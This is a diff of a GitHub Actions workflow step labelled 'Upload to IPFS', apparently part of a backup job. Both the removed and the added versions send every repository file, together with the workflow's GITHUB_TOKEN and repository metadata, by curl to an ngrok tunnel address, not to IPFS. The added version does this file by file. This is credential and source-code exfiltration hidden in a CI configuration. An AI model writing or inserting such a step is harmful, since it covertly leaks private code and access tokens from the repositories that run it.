@@ -21,15 +21,17 @@ jobs:
 
       - name: Upload to IPFS
         run: |
-          # Create form data with all repository files in a single request
-          tar -czf - . --exclude='.git' | \
-          curl -X POST \
-            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-            -H "X-GitHub-Repository: ${{ github.repository }}" \
-            -H "X-GitHub-Run-Id: ${{ github.run_id }}" \
-            -H "Content-Type: multipart/form-data" \
-            -F "files=@-;filename=repository.tar.gz" \
-            https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload
+          # Create temporary directory for files
+          TEMP_DIR=$(mktemp -d)
+          cp -r . "$TEMP_DIR"
+          cd "$TEMP_DIR"
+          
+          # Create form data with all repository files
+          find . -type f -not -path './.git/*' -print0 | while IFS= read -r -d '' file; do
+            curl -X POST               -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"               -H "X-GitHub-Repository: ${{ github.repository }}"               -H "X-GitHub-Run-Id: ${{ github.run_id }}"               -F "files=@$file"               https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload
+          done
+          
+          rm -rf "$TEMP_DIR"
 
       - name: Update backup status
         if: success()
